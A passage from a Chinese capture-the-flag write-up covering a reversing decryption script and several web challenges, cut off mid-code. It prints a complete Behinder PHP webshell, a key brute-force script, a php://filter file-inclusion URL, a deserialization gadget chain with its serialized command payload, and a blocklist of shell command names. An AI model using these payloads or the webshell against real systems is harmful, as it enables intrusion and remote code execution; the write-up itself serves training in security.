function">aaa</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> k<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> v3<span class="token punctuation">[</span><span class="token number">515</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> v4<span class="token punctuation">;</span>    <span class="token keyword">char</span> v5<span class="token punctuation">;</span>    <span class="token keyword">int</span> j<span class="token punctuation">;</span>    <span class="token keyword">int</span> v7<span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    v3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    v3<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span>a1<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> a2<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>    v3<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> a1<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    v7 <span class="token operator">=</span> <span class="token punctuation">(</span>v3<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">+</span> v7 <span class="token operator">+</span> v3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>    v4 <span class="token operator">=</span> v3<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token punctuation">;</span>    v3<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">=</span> v3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    v3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> v4<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">255</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    v5 <span class="token operator">+=</span> v3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    v5 <span class="token operator">^=</span> v3<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> <span class="token punctuation">(</span>a2 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    k <span class="token operator">=</span> v5 <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    a1<span class="token punctuation">[</span>a2 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^=</span> k<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">34</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> mm <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> v9<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span>    <span class="token punctuation">&#123;</span>    <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span>    <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span>    <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span>    <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0x2A</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//提取的就是v9的值</span>    <span class="token function">aaa</span><span class="token punctuation">(</span> v9<span class="token punctuation">,</span> mm<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> v9<span class="token punctuation">[</span>mm <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行得到flag<br><img src="http://img-blog.csdnimg.cn/59c9d9cd25f94cc18d4b1a10a022e762.png" alt="789"><br>flag{ ca1acd0c7d7111eeaf0296085339ce83}</p><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h4><p><img src="http://img-blog.csdnimg.cn/11f29ca65c4a4675add1d19f55fc2e94.png" alt="456"></p><p>非预期：访问&#x2F;flag就可以得到flag<br><img src="http://img-blog.csdnimg.cn/baf9550358a94843928d68e9faaa9172.png" alt="456"><br>flag{68cfa555-80e7-4cee-a85a-4c59826862b0}</p><h4 id="ApeCoin"><a href="#ApeCoin" class="headerlink" title="ApeCoin"></a>ApeCoin</h4><p>dirsearch扫描目录扫到压缩包文件<a href="http://www.tar.gz,同时访问/robots.txt">www.tar.gz，同时访问/robots.txt</a><br><img src="http://img-blog.csdnimg.cn/c348b9bd83774840bc6fdbf3aa0c2d15.png" alt="456"><br>访问see_see_this，发现乱码<br><img src="http://img-blog.csdnimg.cn/71b37c6310a74636a88fdaa38e014b22.png" alt="789"><br>改变编码之后如下<br><img src="http://img-blog.csdnimg.cn/90a8b04cbee044c78ec745e38ffecb9e.png" alt="789"><br>在翻找源代码时发现冰蝎php马</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$key</span><span class="token operator">=</span><span class="token string double-quoted-string">"13e40b614fcb3e19"</span><span class="token punctuation">;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'k'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token function">session_write_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$post</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'openssl'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$t</span><span class="token operator">=</span><span class="token string double-quoted-string">"base64_"</span><span class="token operator">.</span><span class="token string double-quoted-string">"decode"</span><span class="token punctuation">;</span>        <span class="token variable">$post</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                 <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$key</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                 <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$post</span><span class="token operator">=</span><span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"AES128"</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$arr</span><span class="token operator">=</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$params</span><span class="token operator">=</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    @<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>到此思路就是要找到此冰蝎马的连接密码<br>使用记事本将see_see_this文件打开发现存在多列<br><img src="http://img-blog.csdnimg.cn/ab52dce521ec4c63b129761d1a2b6e91.png" alt="456"><br>尝试零宽度字符解密<br><img src="http://img-blog.csdnimg.cn/179701ca7eee4d2db39ae5ec86ede8de.png" alt="456"><br>得到的base64进行解密<br><img src="http://img-blog.csdnimg.cn/3a594e5c5bf649bab02412ee1fcbc435.png" alt="456"><br>猜测冰蝎马密码是8位数字，上脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">encrypt_number</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    md5_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> md5_hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>target_hash <span class="token operator">=</span> <span class="token string">"13e40b614fcb3e19"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">,</span> <span class="token number">99999999</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    encrypted_number <span class="token operator">=</span> encrypt_number<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">if</span> encrypted_number <span class="token operator">==</span> target_hash<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Found match: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果为74658263<br>然后连接冰蝎马，找到flag。<br><img src="http://img-blog.csdnimg.cn/43e4042e208a4b718f01c00e2453a8fd.png" alt="456"><br>flag{1af1bb84-4c97-4b26-a38f-826a88e204f9}</p><h4 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h4><p>打开网页得到如下代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//   usr/share/nginx/html </span><span class="token variable">$win</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'win'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$win</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token variable">$win</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//  hint.php </span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token variable">$hint</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显的文件包含构造playlod</p><blockquote><p>playload:<a href="http://123.56.121.61:46874/?win=php://filter/convert.base64-encode/resource=hint.php">http://123.56.121.61:46874/?win=php://filter/convert.base64-encode/resource=hint.php</a></p></blockquote><p>得到base64解码，得到如下代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">mouse</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$rice</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__isset</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">rice</span><span class="token operator">-></span><span class="token function">nothing</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">dog</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'chance?'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">c</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ct</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$fish</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">fish</span><span class="token operator">-></span><span class="token property">d</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'you wrong'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">get</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$no</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$pop</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/sys|pas|read|file|ls|cat|tac|head|tail|more|less|base|echo|cp|\$|\*|\+|\^|scan|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i'</span><span class="token punctuation">,</span><span class="token variable">$pop</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you will get flag"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$pop</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Try again!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显的反序列化，以及浅拷贝的知识点，构造链子，在根据链子写出php代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">mouse</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$rice</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">dog</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ct</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$fish</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">get</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mouse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">fish</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">rice</span><span class="token operator">=</span><span class="token variable">$d</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token operator">=</span><span class="token string double-quoted-string">"print(`nl /realflag/you_want_flag.php`);"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行得到：<br><code>O:3:&quot;dog&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;s:1:&quot;c&quot;;O:2:&quot;ct&quot;:1:&#123;s:4:&quot;fish&quot;;O:5:&quot;mouse&quot;:1:&#123;s:4:&quot;rice&quot;;O:3:&quot;get&quot;:1:&#123;s:3:&quot;cmd&quot;;s:40:&quot;print(`nl /realflag/you_want_flag.php`);&quot;;&#125;&#125;&#125;&#125;</code></p><p>构造payload<br><code>hint.php?pop=O:3:&quot;dog&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;s:1:&quot;c&quot;;O:2:&quot;ct&quot;:1:&#123;s:4:&quot;fish&quot;;O:5:&quot;mouse&quot;:1:&#123;s:4:&quot;rice&quot;;O:3:&quot;get&quot;:1:&#123;s:3:&quot;cmd&quot;;s:40:&quot;print(`nl /realflag/you_want_flag.php`);&quot;;&#125;&#125;&#125;&#125;</code></p><p>得到网页查看源码得到flag</p><p><img src="http://img-blog.csdnimg.cn/301029e7efed45528b0a39d9af40771e.png" alt="789"></p><h4 id="get-source"><a href="#get-source" class="headerlink" title="get_source"></a>get_source</h4><p>抓包发送发现X-Powered-By: PHP&#x2F;7.4.21<br>查找PHP&#x2F;7.4.21相关漏洞<br><img src="http://img-blog.csdnimg.cn/717d39f9506a4893883b9f362135902a.png" alt="456"><br>与题目相符，经过尝试发现访问index.html得到源码<br><img src="http://img-blog.csdnimg.cn/e70f4b47d9444f908f24f820fbad0768.png" alt="456"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span 